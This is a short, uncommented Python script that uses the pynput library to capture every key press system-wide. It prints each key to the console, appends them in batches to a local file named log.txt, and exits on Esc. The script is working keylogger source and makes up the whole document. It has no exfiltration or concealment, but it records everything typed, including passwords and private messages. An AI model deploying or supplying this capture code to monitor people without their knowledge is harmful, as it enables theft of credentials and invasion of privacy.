import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
	global count, keys
	
	keys.append(key)
	count += 1
	print('key {0} is pressed'.format(key))

	if count>=20:
		count = 0
		write_file(keys)
		keys = []

def write_file(keys):
	with open("log.txt", "a") as f:
		for key in keys:
			f.write(str(key))
			
def on_release(key):
	if key == Key.esc:
        # Stop listener
		return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()
